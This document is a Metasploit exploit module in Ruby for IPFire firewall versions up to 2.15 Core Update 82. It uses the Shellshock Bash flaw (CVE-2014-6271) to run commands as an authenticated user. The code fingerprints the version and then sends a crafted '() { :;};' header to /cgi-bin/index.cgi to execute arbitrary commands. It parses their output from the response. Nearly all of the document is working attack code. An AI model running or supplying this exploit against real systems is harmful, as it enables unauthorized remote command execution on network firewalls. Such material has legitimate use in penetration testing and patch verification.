## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;          => &#039;IPFire Bash Environment Variable Injection (Shellshock)&#039;,
        &#039;Description&#039;   => %q(
          IPFire, a free linux based open source firewall distribution,
          version <= 2.15 Update Core 82 contains an authenticated remote
          command execution vulnerability via shellshock in the request headers.
        ),
        &#039;Author&#039;         =>
          [
            &#039;h00die <mike@stcyrsecurity.com>&#039;, # module
            &#039;Claudio Viviani&#039;                  # discovery
          ],
        &#039;References&#039;     =>
          [
            [ &#039;EDB&#039;, &#039;34839&#039; ],
            [ &#039;CVE&#039;, &#039;2014-6271&#039;]
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Platform&#039;       => %w( linux unix ),
        &#039;Privileged&#039;     => false,
        &#039;DefaultOptions&#039; =>
          {
            &#039;SSL&#039; => true,
            &#039;PAYLOAD&#039; => &#039;cmd/unix/generic&#039;
          },
        &#039;Arch&#039;           => ARCH_CMD,
        &#039;Payload&#039;        =>
          {
            &#039;Compat&#039; =>
              {
                &#039;PayloadType&#039; => &#039;cmd&#039;,
                &#039;RequiredCmd&#039; => &#039;generic&#039;
              }
          },
        &#039;Targets&#039;        =>
          [
            [ &#039;Automatic Target&#039;, {}]
          ],
        &#039;DefaultTarget&#039;  => 0,
        &#039;DisclosureDate&#039; => &#039;Sep 29 2014&#039;
      )
    )
 
    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;User to login with&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Password to login with&#039;, &#039;&#039;]),
        Opt::RPORT(444)
      ], self.class
    )
  end
 
  def check
    begin
      res = send_request_cgi(
        &#039;uri&#039;       => &#039;/cgi-bin/index.cgi&#039;,
        &#039;method&#039;    => &#039;GET&#039;
      )
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code == 401
      /\<strong\>IPFire (?<version>[\d.]{4}) \([\w]+\) - Core Update (?<update>[\d]+)/ =~ res.body
 
      if version && update && version == "2.15" && update.to_i < 83
        Exploit::CheckCode::Appears
      else
        Exploit::CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
 
  #
  # CVE-2014-6271
  #
  def cve_2014_6271(cmd)
    %{() { :;}; /bin/bash -c "#{cmd}" }
  end
 
  def exploit
    begin
      payload = cve_2014_6271(datastore[&#039;CMD&#039;])
      vprint_status("Exploiting with payload: #{payload}")
      res = send_request_cgi(
        &#039;uri&#039;       => &#039;/cgi-bin/index.cgi&#039;,
        &#039;method&#039;    => &#039;GET&#039;,
        &#039;headers&#039;   => { &#039;VULN&#039; => payload }
      )
 
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code == 401
      /<li>Device: \/dev\/(?<output>.+) reports/m =~ res.body
      print_good(output) unless output.nil?
 
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
end

